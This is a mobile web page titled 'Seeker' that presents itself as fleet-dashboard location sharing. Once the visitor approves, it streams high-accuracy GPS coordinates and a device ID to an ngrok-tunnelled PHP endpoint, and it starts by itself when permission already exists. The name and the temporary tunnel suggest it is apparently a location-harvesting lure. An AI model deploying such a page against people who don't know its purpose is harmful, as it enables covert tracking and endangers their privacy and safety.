<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Seeker · Share Location</title>
  <style>
    :root { --bg: #0e1117; --panel: #161b22; --border: #2a3441; --text: #e6edf3; --muted: #8b949e; --success: #3fb950; --error: #ef4444; --warning: #f0b72a; }
    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
    body { font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
    .card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 24px; max-width: 400px; width: 100%; text-align: center; }
    .icon { font-size: 48px; margin-bottom: 16px; }
    h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
    p { color: var(--muted); font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
    .status { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 12px; border-radius: 10px; margin-bottom: 20px; font-size: 14px; font-weight: 600; }
    .status.active { background: rgba(63, 185, 80, 0.15); color: var(--success); }
    .status.pending { background: rgba(240, 183, 42, 0.15); color: var(--warning); }
    .status.error { background: rgba(239, 68, 68, 0.15); color: var(--error); }
    .dot { width: 8px; height: 8px; border-radius: 50%; animation: pulse 2s infinite; }
    .active .dot { background: var(--success); box-shadow: 0 0 10px var(--success); }
    .pending .dot { background: var(--warning); }
    .error .dot { background: var(--error); }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
    .btn { background: var(--success); color: #fff; border: none; border-radius: 10px; padding: 14px 24px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; margin-bottom: 12px; }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
    .coords { background: rgba(139, 148, 158, 0.1); border-radius: 8px; padding: 12px; font-family: monospace; font-size: 13px; color: var(--muted); margin-top: 16px; }
    .coords b { color: var(--text); }
    .info { font-size: 12px; color: var(--muted); margin-top: 16px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">📍</div>
    <h1>Share Your Location</h1>
    <p>This page shares your live GPS location with the fleet dashboard. Keep this page open for continuous tracking.</p>
    
    <div id="status" class="status pending">
      <span class="dot"></span>
      <span id="statusText">Waiting for permission...</span>
    </div>
    
    <button id="startBtn" class="btn" onclick="startTracking()">Approve & Start Sharing</button>
    
    <div id="coords" class="coords" style="display: none;">
      <b>Latitude:</b> <span id="lat">--</span><br>
      <b>Longitude:</b> <span id="lon">--</span><br>
      <b>Accuracy:</b> <span id="acc">--</span>m
    </div>
    
    <div class="info">
      Last update: <span id="lastUpdate">--:--:--</span><br>
      Updates sent: <span id="updateCount">0</span>
    </div>
  </div>

  <script>
    const BACKEND_URL = 'https://trapezoid-tributary-deny.ngrok-free.dev/fleet/handler.php';
    let watchId = null, updateCount = 0, isTracking = false;
    
    function setStatus(state, text) {
      const statusEl = document.getElementById('status');
      const statusText = document.getElementById('statusText');
      statusEl.className = 'status ' + state;
      statusText.textContent = text;
    }
    
    function updateCoords(lat, lon, acc) {
      document.getElementById('coords').style.display = 'block';
      document.getElementById('lat').textContent = lat.toFixed(6);
      document.getElementById('lon').textContent = lon.toFixed(6);
      document.getElementById('acc').textContent = Math.round(acc);
      document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
      document.getElementById('updateCount').textContent = ++updateCount;
    }
    
    async function sendLocation(lat, lon, acc) {
      try {
        await fetch(BACKEND_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            lat: lat,
            lon: lon,
            accuracy: acc,
            speed: 0,
            timestamp: Date.now(),
            device_id: localStorage.getItem('seeker_device_id') || localStorage.setItem('seeker_device_id', 'device-' + Math.random().toString(36).substr(2, 9)) || localStorage.getItem('seeker_device_id')
          })
        });
      } catch (e) {
        console.error('Send failed:', e);
      }
    }
    
    function onPosition(pos) {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;
      
      updateCoords(lat, lon, acc);
      sendLocation(lat, lon, acc);
      
      if (!isTracking) {
        isTracking = true;
        setStatus('active', 'Location sharing active');
        document.getElementById('startBtn').textContent = 'Sharing Location (tap to stop)';
        document.getElementById('startBtn').onclick = stopTracking;
      }
    }
    
    function onError(err) {
      console.error('Location error:', err);
      if (err.code === 1) {
        setStatus('error', 'Permission denied. Tap button to allow.');
      } else if (err.code === 2) {
        setStatus('error', 'Location unavailable');
      } else if (err.code === 3) {
        setStatus('pending', 'Location timeout. Retrying...');
        startTracking(); // Retry
      }
    }
    
    function startTracking() {
      if (watchId) {
        stopTracking();
        return;
      }
      
      setStatus('pending', 'Requesting permission...');
      
      const options = {
        enableHighAccuracy: true,
        maximumAge: 1000,
        timeout: 10000
      };
      
      watchId = navigator.geolocation.watchPosition(onPosition, onError, options);
    }
    
    function stopTracking() {
      if (watchId) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
      }
      isTracking = false;
      setStatus('pending', 'Stopped. Tap to restart.');
      document.getElementById('startBtn').textContent = 'Approve & Start Sharing';
      document.getElementById('startBtn').onclick = startTracking;
    }
    
    // Auto-start if permission already granted
    navigator.permissions.query({ name: 'geolocation' }).then(result => {
      if (result.state === 'granted') {
        startTracking();
      } else if (result.state === 'prompt') {
        setStatus('pending', 'Tap button to allow location');
      } else if (result.state === 'denied') {
        setStatus('error', 'Permission denied. Enable in Settings → Safari → Location');
        document.getElementById('startBtn').disabled = true;
      }
    });
  </script>
</body>
</html>
